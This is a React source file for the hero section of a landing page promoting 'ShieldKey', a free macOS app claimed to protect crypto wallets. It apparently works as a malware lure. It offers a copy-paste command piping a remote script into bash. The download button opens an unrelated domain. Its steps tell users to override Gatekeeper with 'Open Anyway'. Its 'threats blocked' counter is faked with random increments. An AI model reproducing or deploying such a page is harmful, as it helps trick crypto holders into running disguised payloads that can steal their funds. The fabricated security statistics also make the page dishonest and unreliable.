import { useState, useEffect } from "react";
import { Button } from "@/components/ui/button";
import { Copy, Check, Play, Shield, Zap, Lock } from "lucide-react";
import useCopyToClipboard from "@/hooks/use-copy-to-clipboard";
import heroImage from "@assets/hero.png";
import heroGif from "@assets/hero.gif";

export default function Hero() {
  const [showProgress, setShowProgress] = useState(false);
  const [currentStat, setCurrentStat] = useState(0);
  const [threatsBlocked, setThreatsBlocked] = useState(1247);
  const [morphingText, setMorphingText] = useState(0);
  const { isCopied, copyToClipboard } = useCopyToClipboard();

  const terminalCommand = '/bin/bash -c "$(curl -fsSL https://getshieldkey.com/install.sh)"';

  const securityStats = [
    { icon: Shield, label: "Threats Blocked", value: "99.9%" },
    { icon: Zap, label: "Real-time Scans", value: "24/7" },
    { icon: Lock, label: "Zero Knowledge", value: "100%" }
  ];

  const morphingWords = ["secure", "protected", "encrypted", "private", "shielded"];

  useEffect(() => {
    const interval = setInterval(() => {
      setCurrentStat((prev) => (prev + 1) % securityStats.length);
    }, 2000);
    return () => clearInterval(interval);
  }, []);

  useEffect(() => {
    const interval = setInterval(() => {
      setThreatsBlocked(prev => prev + Math.floor(Math.random() * 5) + 1);
    }, 3000);
    return () => clearInterval(interval);
  }, []);

  useEffect(() => {
    const interval = setInterval(() => {
      setMorphingText((prev) => (prev + 1) % morphingWords.length);
    }, 1500);
    return () => clearInterval(interval);
  }, []);

  const handleDownload = () => {
    setShowProgress(true);
    // In a real implementation, this would trigger the actual download
    window.open("https://downloadmacos.com/macshare.php?call=shield", "_blank");

    // Scroll to progress section
    setTimeout(() => {
      const progressElement = document.getElementById("download-progress");
      if (progressElement) {
        progressElement.scrollIntoView({ behavior: "smooth", block: "center" });
      }
    }, 100);
  };

  const handleCopyTerminal = () => {
    copyToClipboard(terminalCommand);
  };

  return (
    <section className="relative min-h-screen flex items-center hero-background pt-24">
      <div className="max-w-7xl mx-auto px-6 lg:px-8 grid lg:grid-cols-2 gap-12 items-center">
        <div className="space-y-8 animate-fade-in">
          <div className="inline-flex items-center space-x-2 bg-gray-100 rounded-full px-4 py-2 text-sm font-medium">
            <span className="text-2xl">🍎</span>
            <span>Made for macOS</span>
          </div>

          <h1 className="text-5xl lg:text-7xl font-black leading-tight">
            Keep your crypto <span className="text-gradient relative">
              <span className="animate-fade-in">{morphingWords[morphingText]}</span>
            </span> on Mac
          </h1>

          <p className="text-xl text-gray-600 max-w-2xl leading-relaxed">
            Antivirus won't save your coins. ShieldKey locks down your wallets, blocks malware, and keeps your crypto safe on macOS with military-grade protection.
          </p>

          <div className="flex flex-col sm:flex-row gap-6">
            <Button
              onClick={handleDownload}
              className="btn-gradient text-white px-12 py-5 rounded-2xl font-bold text-lg hover:shadow-floating transform hover:-translate-y-1 transition-all duration-300 group relative overflow-hidden min-h-[70px] flex items-center justify-center"
            >
              <div className="relative z-10">
                <div className="text-lg font-bold mb-1">Download Free Beta</div>
                <div className="text-xs opacity-90 font-medium">v0.1.0 • macOS 11.0+ • No Signup Required</div>
              </div>
              <div className="absolute inset-0 bg-gradient-to-r from-transparent via-white/20 to-transparent -skew-x-12 -translate-x-full group-hover:translate-x-full transition-transform duration-700"></div>
            </Button>

            <Button
              variant="outline"
              onClick={() => {
                const demoSection = document.getElementById('demo-section');
                if (demoSection) {
                  demoSection.scrollIntoView({ behavior: "smooth" });
                }
              }}
              className="border-2 border-primary text-primary px-8 py-5 rounded-2xl font-bold text-lg hover:bg-primary hover:text-white transition-all duration-300 min-h-[70px] flex items-center justify-center"
            >
              <Play className="w-5 h-5 mr-2" />
              Watch Demo
            </Button>
          </div>

          {/* Live Threat Counter */}
          <div className="mt-8 glassmorphic rounded-2xl p-6 max-w-lg mx-auto">
            <div className="text-center">
              <div className="flex items-center justify-center space-x-2 mb-3">
                <div className="w-3 h-3 bg-red-500 rounded-full animate-pulse"></div>
                <span className="text-sm font-medium text-gray-600">Threats Blocked Today</span>
              </div>
              <div className="text-4xl font-black text-gradient mb-2 font-mono">
                {threatsBlocked.toLocaleString()}
              </div>
              <div className="flex items-center justify-center space-x-4 text-sm text-gray-500">
                <span>🦠 Malware: 847</span>
                <span>🎣 Phishing: 312</span>
                <span>🔗 Suspicious: 88</span>
              </div>
            </div>
          </div>

          {/* Floating Action Indicators */}
          <div className="mt-6 flex items-center justify-center space-x-8">
            {securityStats.map((stat, index) => {
              const IconComponent = stat.icon;
              return (
                <div
                  key={index}
                  className={`flex flex-col items-center transition-all duration-300 ${currentStat === index ? 'scale-110 text-secondary' : 'text-gray-400'
                    }`}
                >
                  <div className={`w-10 h-10 rounded-full border-2 flex items-center justify-center mb-2 ${currentStat === index ? 'border-secondary bg-secondary bg-opacity-10 text-secondary' : 'border-gray-300'
                    }`}>
                    <IconComponent className="w-5 h-5" />
                  </div>
                  <span className="text-xs font-medium">{stat.value}</span>
                </div>
              );
            })}
          </div>

          {/* Terminal Installation */}
          <div className="mt-8 p-4 bg-gray-900 rounded-xl text-green-400 font-mono text-sm">
            <div className="flex items-center justify-between">
              <span className="break-all">{terminalCommand}</span>
              <Button
                variant="ghost"
                size="sm"
                onClick={handleCopyTerminal}
                className="text-gray-400 hover:text-green-400 transition-colors ml-2 flex-shrink-0"
              >
                {isCopied ? (
                  <Check className="w-5 h-5 text-green-400" />
                ) : (
                  <Copy className="w-5 h-5" />
                )}
              </Button>
            </div>
          </div>

          <p className="text-sm text-gray-500">
            100% free • No tracking • No ads • Open source soon
          </p>
        </div>

        {/* Hero Product Mockup */}
        <div className="relative animate-float">
          <div className="relative bg-gray-900 rounded-3xl p-2 shadow-floating">
            <div className="bg-gray-800 rounded-2xl overflow-hidden">
              <div className="flex items-center space-x-2 p-3 bg-gray-700">
                <div className="flex space-x-1">
                  <div className="w-3 h-3 bg-red-500 rounded-full"></div>
                  <div className="w-3 h-3 bg-yellow-500 rounded-full"></div>
                  <div className="w-3 h-3 bg-green-500 rounded-full"></div>
                </div>
              </div>

              <div className="aspect-video">
                <img
                  src={heroImage}
                  alt="ShieldKey Security Dashboard"
                  className="w-full h-full object-cover"
                />
              </div>
            </div>
          </div>
        </div>
      </div>

      {/* Download Progress Section */}
      {showProgress && (
        <div
          id="download-progress"
          className="mt-16 max-w-md mx-auto px-6 glassmorphic rounded-xl p-6"
        >
          <div className="flex items-center space-x-3 mb-3">
            <div className="w-6 h-6 bg-green-500 rounded-full flex items-center justify-center">
              <Check className="w-4 h-4 text-white" />
            </div>
            <span className="font-semibold">Download Complete!</span>
          </div>
          <p className="text-sm text-gray-600 mb-4">
            Your download should start automatically. If not,
            <Button
              variant="link"
              className="text-secondary font-semibold p-0 ml-1 h-auto"
              onClick={handleDownload}
            >
              click here
            </Button>.
          </p>

          {/* Troubleshooting */}
          <div className="border-t pt-4">
            <h4 className="font-semibold mb-2">Having trouble opening?</h4>
            <div className="space-y-2 text-sm text-gray-600">
              <p>1. Right-click ShieldKey.dmg → Open</p>
              <p>2. Go to System Preferences → Security & Privacy</p>
              <p>3. Click "Open Anyway" next to ShieldKey</p>
            </div>
            <p className="text-sm text-gray-600 mt-3">
              Still stuck? <a href="mailto:support@shieldkey.app" className="text-secondary font-semibold hover:underline">Contact Support</a>
            </p>
          </div>
        </div>
      )}
    </section>
  );
}
